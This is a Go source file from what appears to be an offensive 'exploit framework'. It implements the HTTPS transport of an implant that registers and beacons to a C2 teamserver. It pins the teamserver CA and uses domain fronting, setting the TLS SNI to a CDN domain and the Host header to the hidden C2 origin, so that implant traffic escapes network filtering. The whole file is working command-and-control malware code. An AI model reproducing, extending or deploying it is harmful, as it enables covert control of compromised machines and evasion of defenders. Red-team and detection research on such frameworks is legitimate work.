package transport

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

type HTTPSTransport struct {
	baseURL    string
	cdnDomain  string // CDN domain for domain fronting (TLS SNI only)
	originHost string // real C2 host for HTTP Host header when fronting
	client     *http.Client
}

func NewHTTPSTransport(baseURL string, caCertPEM string, cdnDomain string) (*HTTPSTransport, error) {
	// Fail closed: HTTPS implants must pin the teamserver CA. Builds without an embedded
	// CA used to set InsecureSkipVerify and were MITM-able on any TLS endpoint.
	if caCertPEM == "" {
		return nil, fmt.Errorf("CA certificate required for HTTPS transport (embed at build via CACertPath / caCertPEM ldflag)")
	}
	certPool := x509.NewCertPool()
	if !certPool.AppendCertsFromPEM([]byte(caCertPEM)) {
		return nil, fmt.Errorf("failed to parse CA certificate PEM")
	}
	tlsConfig := &tls.Config{
		RootCAs:            certPool,
		InsecureSkipVerify: false,
	}

	// Domain fronting: SNI = CDN domain; Host header = real origin (callback host).
	originHost := ""
	if u, err := url.Parse(baseURL); err == nil {
		originHost = u.Host
	}
	if cdnDomain != "" {
		tlsConfig.ServerName = cdnDomain
	}

	return &HTTPSTransport{
		baseURL:    baseURL,
		cdnDomain:  cdnDomain,
		originHost: originHost,
		client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: tlsConfig,
			},
		},
	}, nil
}

func (t *HTTPSTransport) Register(reg *pb.Register) (*pb.RegisterResponse, error) {
	data, err := proto.Marshal(reg)
	if err != nil {
		return nil, fmt.Errorf("marshal register: %w", err)
	}

	resp, err := t.post("/register", data)
	if err != nil {
		return nil, err
	}

	result := &pb.RegisterResponse{}
	if err := proto.Unmarshal(resp, result); err != nil {
		return nil, fmt.Errorf("unmarshal register response: %w", err)
	}
	return result, nil
}

func (t *HTTPSTransport) Beacon(beacon *pb.Beacon) (*pb.BeaconResponse, error) {
	data, err := proto.Marshal(beacon)
	if err != nil {
		return nil, fmt.Errorf("marshal beacon: %w", err)
	}

	resp, err := t.post("/beacon", data)
	if err != nil {
		return nil, err
	}

	result := &pb.BeaconResponse{}
	if err := proto.Unmarshal(resp, result); err != nil {
		return nil, fmt.Errorf("unmarshal beacon response: %w", err)
	}
	return result, nil
}

func (t *HTTPSTransport) post(path string, body []byte) ([]byte, error) {
	url := t.baseURL + path
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	// Domain fronting: SNI is already CDN (ServerName); Host must be the real
	// C2 origin host so the CDN routes to our backend.
	if t.cdnDomain != "" && t.originHost != "" {
		req.Host = t.originHost
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("HTTP POST %s: %w", path, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d from %s", resp.StatusCode, path)
	}

	return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}
